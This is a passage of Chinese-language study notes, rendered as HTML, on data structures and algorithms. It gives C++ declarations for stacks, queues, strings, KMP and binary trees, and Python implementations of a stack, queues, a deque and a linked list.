c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 静态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data[],*next&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 初始化栈，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>;</span><br><span class="line"><span class="comment">// 判空，top == -1，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>;</span><br><span class="line"><span class="comment">// 入栈，栈满 top == MaxSize - 1，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span></span>;</span><br><span class="line"><span class="comment">// 出栈，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S , ElemType &amp;x)</span></span>;</span><br><span class="line"><span class="comment">// 读栈顶元素，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetTop</span><span class="params">(SqStack S , ElemType &amp;x)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>其他栈</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 共享栈</span></span><br><span class="line"><span class="comment">// 同空间不同栈底。</span></span><br><span class="line">(top0 == <span class="number">-1</span>) &amp;&amp; (top1 == MaxSize) <span class="comment">// 为空。</span></span><br><span class="line">(top1 - top0) == <span class="number">1</span> <span class="comment">// 为栈满</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 链栈</span></span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data,*next&#125;;</span><br></pre></td></tr></table></figure></li><li><p>栈的应用</p><ul><li><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/2-3.1栈char类型.cpp">my::文本编辑器代码</a></p></li><li><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/2-3.2迷宫算法.cpp">my::迷宫算法代码</a></p></li><li><p>表达式求值（未实现）</p></li></ul></li></ul><h3 id="2-队列"><a href="#2-队列" class="headerlink" title="2 队列"></a>2 队列</h3><blockquote><p>先进先出的线性表。</p></blockquote><ul><li><p>所有队列操作</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span></span>;</span><br><span class="line"><span class="comment">// 判空，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">(SqQueue Q)</span></span>;</span><br><span class="line"><span class="comment">// 入队，判满，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span></span>;</span><br><span class="line"><span class="comment">// 出队，判空，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q,ElemType &amp;x)</span></span>;</span><br><span class="line"><span class="comment">// 获得队头元素，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetHead</span><span class="params">(SqQueue Q,ElemType &amp;x)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>顺序队列</p><p><code>struct &#123; data[] , front , rear &#125;;</code></p><ul><li>栈空：<code>front = rear = 0</code></li><li><code>rear == MaxSize</code> 不能判断队满</li></ul></li><li><p>循环队列</p><ul><li>初始：<code>front = rear = 0</code></li><li>front+1：<code>front = (front + 1)%MaxSize</code></li><li>rear+1：<code>rear = (rear + 1)%MaxSize</code></li><li><p>长度：<code>(rear+MaxSize-front)%MaxSize</code></p></li><li><p>判断栈满：</p><ol><li>牺牲一个单元<ul><li>满：<code>(rear + 1)%MaxSize == front</code></li><li>空：<code>front == rear</code></li><li>长度：<code>(rear+MaxSize-front)%MaxSize</code></li></ul></li><li>增设表示元素个数的成员，size</li><li>设置 tag 判断队空<ul><li>tag = 0，因删除 <code>front == rear</code>，队空</li><li>tag = 1，因插入<code>front == rear</code>，队满</li></ul></li></ol></li></ul></li><li><p>链式队列</p><ul><li>结点：<code>struct node &#123;data,*next&#125;;</code></li><li>队列：<code>struct queue&#123;*front,*rear&#125;;</code></li><li><code>front == NULL &amp;&amp; rear == NULL</code> 队列为空</li></ul></li><li><p>双端队列</p><ul><li>两端入两端出。</li><li>输出受限：两端入一端出。</li><li>输入受限：一端入两端出。</li></ul></li><li><p>队列的应用</p></li></ul><h3 id="3-数组"><a href="#3-数组" class="headerlink" title="3 数组"></a>3 数组</h3><blockquote><p>维度和维界不变的线性表。</p><p><a href="https://blog.csdn.net/lamdonn/article/details/129192959">不定参数</a></p></blockquote><ul><li>行存储： <code>LOC(a[i,j]) = LOC(a[0,0])+[i*(col_len+ 1)+j]*size</code></li><li>列存储： <code>LOC(a[i,j]) = LOC(a[0,0])+[j*(row_len+1)+i]*size</code></li></ul><h3 id="4-特殊矩阵"><a href="#4-特殊矩阵" class="headerlink" title="4 特殊矩阵"></a>4 特殊矩阵</h3><blockquote><ul><li>压缩矩阵：多同值元素仅分配一个存储空间，零元素不分配空间。</li><li>特殊矩阵：有许多相同元素或零，且分布有一定规律。</li><li>矩阵分区：下三角区，主对角线，上三角区。</li><li>行优先：先存完该行的每一列。</li><li>列优先：先存完该列的每一行。</li></ul></blockquote><ul><li><p>对称矩阵</p><ul><li><p>定义：n 阶矩阵任一元素都 <code>a[i,j] = a[j,i]</code></p><blockquote><p>一般上三角折到下三角。</p></blockquote></li></ul></li><li><p>三角矩阵</p><ul><li>下三角矩阵：上三角区元素均为同一变量（不包括主对角线），则在线性存储时尾部加一个空间存上三角值。</li><li>上三角矩阵：同理。</li></ul></li><li><p>三对角矩阵</p><ul><li>定义：n 阶矩阵任一元素 <code>a[i,j]</code>，当 <code>|i - j| &gt; 1</code> 时有 <code>a[i,j] = 0</code></li><li>通俗：首位两行各两个元素，其他行每行只有三个元素，坐标是<code>j = i-1，j = i，j = i+1</code></li></ul></li><li><p>稀疏矩阵</p><blockquote><p>m <em> n的矩阵中含有t个非零元素，当t / ( m </em> n)  &lt;= 0.5 时称为稀疏矩阵。</p></blockquote><ul><li>存储：数组，十字链表。</li></ul></li></ul><hr><h2 id="三、串"><a href="#三、串" class="headerlink" title="三、串"></a>三、串</h2><h3 id="1-串"><a href="#1-串" class="headerlink" title="1 串"></a>1 串</h3><blockquote><p>存字符的线性表。</p></blockquote><ul><li><p>串</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 静态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;ch[],length&#125;;</span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;*ch,length&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 赋值，串 T 值改为 chars</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrAssign</span><span class="params">(String &amp;T,String chars)</span></span>;</span><br><span class="line"><span class="comment">// 复制，串 S 复制给 T</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrCopy</span><span class="params">(String &amp;T,String S)</span></span>;</span><br><span class="line"><span class="comment">// 判空</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StrEmpty</span><span class="params">(String S )</span></span>;</span><br><span class="line"><span class="comment">// 比较，len(S) - len(T)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StrCompare</span><span class="params">(String S,String T)</span></span>;</span><br><span class="line"><span class="comment">// 串长</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StrLength</span><span class="params">(String S)</span></span>;</span><br><span class="line"><span class="comment">// return Sub = S[pos:pos+len]</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SubString</span><span class="params">( String &amp;Sub,String S,<span class="type">int</span> pos,<span class="type">int</span> len)</span></span>;</span><br><span class="line"><span class="comment">// 拼接</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Concat</span><span class="params">(String &amp;T,String S1,String S2)</span></span>;</span><br><span class="line"><span class="comment">// 找 S 中第一次出现的子串 T 的索引</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Index</span><span class="params">(String S,String T)</span></span>;</span><br><span class="line"><span class="comment">// 清空</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClearString</span><span class="params">(String &amp;S)</span></span>;</span><br><span class="line"><span class="comment">// 销毁</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyString</span><span class="params">(String &amp;S)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-KMP算法"><a href="#2-KMP算法" class="headerlink" title="2 KMP算法"></a>2 KMP算法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = haystack.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> subLen = needle.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> lp = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> rp = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">next</span><span class="params">(subLen, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">buildNext</span>(needle, subLen, next);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (lp &lt; len &amp;&amp; rp &lt; subLen)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (haystack[lp] == needle[rp])</span><br><span class="line">            &#123;</span><br><span class="line">                lp++;</span><br><span class="line">                rp++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (rp &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                rp = next[rp - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                lp++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rp == subLen)</span><br><span class="line">        &#123;</span><br><span class="line">            res = lp - rp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buildNext</span><span class="params">(string needle, <span class="type">int</span> subLen, vector&lt;<span class="type">int</span>&gt;&amp; next)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> prefix_len = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(i &lt; subLen)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(needle[prefix_len] == needle[i])</span><br><span class="line">            &#123;</span><br><span class="line">                prefix_len++;</span><br><span class="line">                next[i] = prefix_len;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(prefix_len != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    prefix_len = next[prefix_len - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    next[i] = <span class="number">0</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="四、树"><a href="#四、树" class="headerlink" title="四、树"></a>四、树</h2><h3 id="1-树"><a href="#1-树" class="headerlink" title="1 树"></a>1 树</h3><blockquote><p>分支关系的非线性结构。</p><p>任何一个非空树是一个二元组。Tree = ( root , F )。</p><ul><li>root：根节点。</li><li>F：子树森林。</li></ul></blockquote><ul><li>基本概念</li></ul><div class="table-container"><table><thead><tr><th>名称</th><th>意义</th></tr></thead><tbody><tr><td>结点</td><td>数据元素 + 若干指向子树的分支</td></tr><tr><td>结点的度</td><td>分支的个数</td></tr><tr><td>树的度</td><td>树中所有结点的度的最大值</td></tr><tr><td>叶子结点</td><td>度等于0的结点</td></tr><tr><td>分支结点</td><td>度大于0的结点</td></tr><tr><td>孩子结点</td><td>下一级</td></tr><tr><td>双亲结点</td><td>上一级</td></tr><tr><td>兄弟结点</td><td>同级</td></tr><tr><td>祖先结点</td><td>上级</td></tr><tr><td>子孙结点</td><td>下级</td></tr><tr><td>层次</td><td>树的层数</td></tr><tr><td>深度</td><td>最大层次</td></tr><tr><td>森林</td><td>多个互不相交的树的集合</td></tr></tbody></table></div><ul><li>树</li></ul><h3 id="2-二叉树"><a href="#2-二叉树" class="headerlink" title="2 二叉树"></a>2 二叉树</h3><blockquote><p>每个结点至多只有两颗子树，且子树有左右之分的树。</p></blockquote><ul><li><p>基本概念</p><ul><li><p>二叉树的五种状态</p><ol><li>空</li><li>只有跟结点</li><li>有根结点和左子树</li><li>有根结点和右子树</li><li>有跟结点和左右子树</li></ol></li><li><p>二叉树性质</p><ol><li>在二叉树的第 i 层至多有 2 ^ ( i - 1 )个结点( i &gt;= 1)。</li><li>深度为 k 的二叉树上至多有 2 ^ k - 1个结点( k &gt;= 1)。</li><li>任何一颗二叉树，他含有n0个叶子结点，n2个度为2的结点，则必然有n0 = n2 + 1。</li></ol></li><li><p>满二叉树</p><blockquote><p>深度为 k 且含有 2 ^ k - 1 个结点的二叉树。</p></blockquote></li><li><p>完全二叉树</p><blockquote><p>树中所含的 n 个结点和满二叉树中编号为 1至n 的结点一一对应。（从左到右从上到下编号，不一定是满二叉树）</p></blockquote></li><li><p>完全二叉树性质（123如上）：</p><ol><li>具有 n 个结点的完全二叉树的深度为   ⌊log2 n⌋+ 1 。 （⌊⌋ 向下取整）</li><li>⌊2i⌋ 为根节点 ，i 的左孩子是 2i ， 右孩子是 2i + 1。所以若 2i / 2i + 1 &gt; n 则该结点无左孩子/右孩子。</li></ol></li></ul></li><li><p>二叉树</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>    <span class="comment">//二叉链表</span></span><br><span class="line">&#123;</span><br><span class="line">        TElemType data;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* lchild, * rchild;  <span class="comment">//左右孩子</span></span><br><span class="line">&#125;BiTNode, * BiTree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TriTNode</span>    <span class="comment">//三叉链表</span></span><br><span class="line">&#123;</span><br><span class="line">        TElemType data;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">TriTNode</span>* lchild, * rchild;  <span class="comment">//左右孩子</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">TriTNode</span>* parent;  <span class="comment">//双亲结点</span></span><br><span class="line">&#125;TriTNode, * TriTree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BPTNode</span>   <span class="comment">//双亲链表</span></span><br><span class="line">&#123;</span><br><span class="line">        TElemType data;</span><br><span class="line">        <span class="type">int</span>* parent;  <span class="comment">//双亲结点</span></span><br><span class="line">        <span class="type">char</span> LRTag;  <span class="comment">//标志自己是左孩子还是右孩子</span></span><br><span class="line">&#125;BPTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BPTree</span></span><br><span class="line">&#123;</span><br><span class="line">        BPTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">        <span class="type">int</span> num_node;  <span class="comment">//结点数目</span></span><br><span class="line">        <span class="type">int</span> root;  <span class="comment">//根节点</span></span><br><span class="line">&#125;BPTree;</span><br><span class="line"></span><br><span class="line">SqBiTree[MAX_TREE_SIZE];    <span class="comment">//顺序存储（按编号，常用于完全二叉树）</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="五、图"><a href="#五、图" class="headerlink" title="五、图"></a>五、图</h2><hr><h2 id="六、算法"><a href="#六、算法" class="headerlink" title="六、算法"></a>六、算法</h2><blockquote><p><a href=".\ea53bcd3">text::算法进阶</a> </p></blockquote><hr><h2 id="七、案例"><a href="#七、案例" class="headerlink" title="七、案例"></a>七、案例</h2><h3 id="1-日期之差"><a href="#1-日期之差" class="headerlink" title="1 日期之差"></a>1 日期之差</h3><blockquote><p><a href="https://blog.csdn.net/weixin_58045538/article/details/128903716">author::日期之差</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算从 0001-1-1 起的天数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">countdays</span><span class="params">(<span class="type">int</span> y, <span class="type">int</span> m, <span class="type">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m &lt; <span class="number">3</span>)    y--, m += <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">365</span> * y + (y &gt;&gt; <span class="number">2</span>) - y / <span class="number">100</span> + y / <span class="number">400</span> + (<span class="number">153</span> * m - <span class="number">457</span>) / <span class="number">5</span> + d - <span class="number">306</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Python数据结构与算法"><a href="#Python数据结构与算法" class="headerlink" title="Python数据结构与算法"></a>Python数据结构与算法</h1><blockquote><p> <a href=".\a378bd8e">text::Python</a></p><p><a href=".\ea53bcd3">text::Python蓝桥杯题集</a> </p></blockquote><hr><h2 id="一、引论"><a href="#一、引论" class="headerlink" title="一、引论"></a>一、引论</h2><ul><li><p>图灵机</p><blockquote><p>左半全a右半全b判断是否满足要求。</p><p>例子：aaaabbbb，从头开始，先擦除头a，再右移到尾，擦除尾b，再左移到a，擦除头a，循环，直到全被擦除返回真，否则返回假。</p></blockquote></li><li><p>数据类型的性能<img src="/posts/4b0178e0/listO.jpg" alt="img"><img src="/posts/4b0178e0/dictO.jpg" alt="img"></p><ul><li><p>列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># O(1)</span></span><br><span class="line">x = lst[i]</span><br><span class="line">lst[i] = x</span><br><span class="line"><span class="comment"># O(1)</span></span><br><span class="line">lst.append(x)：</span><br><span class="line"><span class="comment"># O(n + k)(k是被加列表长度)</span></span><br><span class="line">lst = lst + new_lst</span><br></pre></td></tr></table></figure></li></ul></li><li><p>外部库数据结构</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install pythonds3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二叉堆</span></span><br><span class="line"><span class="keyword">from</span> pythonds3.trees.binary_heap <span class="keyword">import</span> BinaryHeap</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="二、栈"><a href="#二、栈" class="headerlink" title="二、栈"></a>二、栈</h2><h3 id="1-栈实现"><a href="#1-栈实现" class="headerlink" title="1 栈实现"></a>1 栈实现</h3><blockquote><p>list末端是栈顶，首端是栈底。底不会变，变的是顶的位置。（时间复杂度较低）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__stack = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__stack.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__stack.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__stack[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__stack == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__stack)</span><br></pre></td></tr></table></figure><h3 id="2-表达式求值"><a href="#2-表达式求值" class="headerlink" title="2 表达式求值"></a>2 表达式求值</h3><hr><h2 id="三、队列"><a href="#三、队列" class="headerlink" title="三、队列"></a>三、队列</h2><h3 id="1-队列实现"><a href="#1-队列实现" class="headerlink" title="1 队列实现"></a>1 队列实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list首端队首，末端队尾</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__queue = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enqueue</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__queue.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequeue</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__queue)</span><br><span class="line"><span class="comment"># 其中enqueue为 O(1)，dequeue为O(n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># list首端队尾，末端队首</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__queue = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enqueue</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__queue.insert(<span class="number">0</span>,item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequeue</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__queue == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__queue)</span><br><span class="line"><span class="comment"># 其中enqueue为O(n)，dequeue为O(1)</span></span><br></pre></td></tr></table></figure><h3 id="2-双端队列实现"><a href="#2-双端队列实现" class="headerlink" title="2 双端队列实现"></a>2 双端队列实现</h3><blockquote><p>如果端相反，则操作和时间复杂度都相反。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list首端队首，末端队尾</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Deque</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__deque = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addFront</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__deque.insert(<span class="number">0</span>,item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addRear</span>(<span class="params">self,item:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__deque.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeFront</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__deque.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeRear</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__deque.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__deque == []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__deque)</span><br><span class="line"><span class="comment"># 其中addFront/removeFront为O(n)，addRear/removeRear为O(1)</span></span><br></pre></td></tr></table></figure><hr><h2 id="四、链表"><a href="#四、链表" class="headerlink" title="四、链表"></a>四、链表</h2><h3 id="1-普通无序链表"><a href="#1-普通无序链表" class="headerlink" title="1 普通无序链表"></a>1 普通无序链表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,intidata:<span class="built_in">any</span></span>):</span><br><span class="line">        self.__data = intidata</span><br><span class="line">        self.__<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getNext</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setData</span>(<span class="params">self,newdata:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__data = newdata</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setNext</span>(<span class="params">self,newnext:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__<span class="built_in">next</span> = newnext</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeadNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getNext</span>(<span class="params">self</span>)-&gt;Node:</span><br><span class="line">        <span class="keyword">return</span> self.__<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setNext</span>(<span class="params">self,newnext:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.__<span class="built_in">next</span> = newnext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self,item:<span class="built_in">any</span>,location:<span class="built_in">int</span>=<span class="number">1</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        new = Node(item)</span><br><span class="line">        <span class="keyword">if</span> location == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> self.getNext() != <span class="literal">None</span>:</span><br><span class="line">                new.setNext(self.getNext())</span><br><span class="line">                self.setNext(new)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.setNext(new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n = self.getNext()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,location - <span class="number">1</span>):</span><br><span class="line">                n = n.getNext()</span><br><span class="line">            new.setNext(n.getNext())</span><br><span class="line">            n.setNext(new)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">if</span> self.getNext() != <span class="literal">None</span>:</span><br><span class="line">            n = self.getNext()</span><br><span class="line">            <span class="keyword">while</span> 